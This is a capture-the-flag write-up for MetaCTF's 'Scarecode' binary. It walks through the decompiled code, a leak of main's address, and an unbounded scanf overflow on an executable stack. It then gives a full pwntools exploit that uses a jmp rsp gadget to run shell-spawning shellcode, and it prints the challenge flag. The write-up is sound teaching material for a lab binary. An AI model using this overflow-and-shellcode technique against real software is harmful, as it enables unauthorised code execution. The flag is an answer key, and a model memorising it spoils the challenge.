---
title: MetaCTF October 2025 Flash CTF Scarecode
draft: false
tags:
  - ctf
  - reverse-engineering
  - binary-exploitation
---
# Scarecode

> Trick or Treat? See if you can scare this binary into giving you the flag...

We're provided a binary, that when opened in Ghidra (or your decompiler of choice), looks something like this:

```
undefined8 real_main(void)

{
  bool bVar1;
  int user_choice;
  short local_94;
  
  setup();
  puts("Welcome to Scarecode!");
  do {
    while( true ) {
      puts("Trick or treat? (q to quit)");
      __isoc99_scanf(&prompt_format,&user_choice);
      if ((user_choice != 0x63697274) || (local_94 != 0x6b)) break;
LAB_00101197:
      trick();
    }
    if (user_choice == 0x63697254) {
      if (local_94 != 0x6b) goto badChoice;
      goto LAB_00101197;
    }
    if (user_choice == 0x43495254) {
      if (local_94 == 0x4b) goto LAB_00101197;
LAB_0010115d:
      if (user_choice == 0x61657254) {
        if (local_94 == 0x74) goto treat;
        bVar1 = true;
      }
      else {
        bVar1 = user_choice != 0x41455254;
      }
      if ((bVar1) || (local_94 != 0x54)) {
        puts("Neither trick nor treat, you say? Well, that\'s not very festive.");
        return 1;
      }
    }
    else {
badChoice:
      if ((user_choice != 0x61657274) || (local_94 != 0x74)) goto LAB_0010115d;
    }
treat:
    __printf_chk(1,"Have the address of main, as a treat! %p\n",real_main);
  } while( true );
}
```

There's a few things to note here. It asks for input in a continuous loop, and validates against `trick` or `treat`. If `treat`, it prints the address of our main function. If `trick`, it enters a separate function, which looks like:

```

void trick(void)

{
  char cVar1;
  size_t sVar2;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  undefined8 uStack_80;
  char name [112];
  
  uStack_80 = 0x101356;
  puts("Trick you say?, tell me your name");
  uStack_80 = 0x10136a;
  __isoc99_scanf(&name_format,name);
  uStack_80 = 0x101372;
  sVar2 = strlen(name);
  if (sVar2 >> 1 != 0) {
    pcVar3 = name + (sVar2 - 1);
    pcVar4 = name;
    do {
      cVar1 = *pcVar4;
      pcVar5 = pcVar4 + 1;
      *pcVar4 = *pcVar3;
      *pcVar3 = cVar1;
      pcVar3 = pcVar3 + -1;
      pcVar4 = pcVar5;
    } while (pcVar5 != name + (sVar2 >> 1));
  }
  uStack_80 = 0x1013b8;
  __printf_chk(1,"OOOooooOOOOOOOoooooOOO %s olleH OOOooooOOOOOOOoooooOOO\n",name);
  return;
}
```

At this point, it's relatively clear what needs to happen. Firstly, we have a leak of main, which probably indicates PIE/ASLR is enabled. To confirm, we can run `checksec` from pwntools:

```
checksec scarecode
[*] '/Users/landoncrabtree/Downloads/metactf/scarecode_chal/scarecode'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

And as we guessed, there is PIE. But, we also have an executable stack! Additionally, back to our `trick()` function: we allocate a buffer of 112 bytes, but our `scanf` call does not specify a length in the format. This means, we can scan an arbitrary number of bytes into the 112 byte buffer: a typical stack-based buffer overflow. The only "gotcha" is that it takes your input and reverses it. However, we can get around this by simply making our payload start with a null byte (`0x00`), as strlen will detect it and assume that's the end of the string (thus, not reverse anything), but `scanf` will scan the entire thing in because it stops at newline, not null terminator. So, our basic attack plan is:

1. Leak the address of main to determine our PIE base
2. Overflow the buffer to return to RIP
3. Send a `jmp rsp` ROP gadget and our shellcode

```python
#!/usr/bin/env python3
import argparse

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.update(arch="amd64", os="linux")


BIN_PATH = "./scarecode"
REAL_MAIN_OFF = 0x1010E0 - 0x100000  # calculate ghidra image base to get raw offset
JMP_RSP_OFF = 0x13E8  # ROPgadget --binary scarecode | grep jmp rsp
OFFSET_TO_RIP = 0x78  # 0x70 buffer + 0x8 saved r12


def start():
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    parser.add_argument("--gdb", action="store_true")
    args = parser.parse_args()
    if args.remote:
        io = remote(args.remote[0], int(args.remote[1]))
    else:
        io = process(BIN_PATH)
        if args.gdb:
            gdb.attach(io)
    return io


def leak_pie(io):
    io.recvuntil(b"Trick or treat?")
    io.sendline(b"treat")
    line = io.recvline_contains(b"address of main").strip()
    leak_str = line.split()[-1]
    leak = int(leak_str, 16)
    pie = leak - REAL_MAIN_OFF
    return pie


def build_payload(pie_base):
    jmp_rsp = pie_base + JMP_RSP_OFF
    sc = asm(shellcraft.linux.sh())
    prefix = b"B\x00"  # force strlen to stop early; reverse won’t touch overflow region
    pad = b"A" * (OFFSET_TO_RIP - len(prefix))
    payload = prefix + pad + p64(jmp_rsp) + sc
    return payload


def main():
    io = start()
    pie_base = leak_pie(io)
    io.sendline(b"trick")
    io.recvuntil(b"name")
    payload = build_payload(pie_base)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

`MetaCTF{$p00ky_sc4ry_sh3llet0ns}`



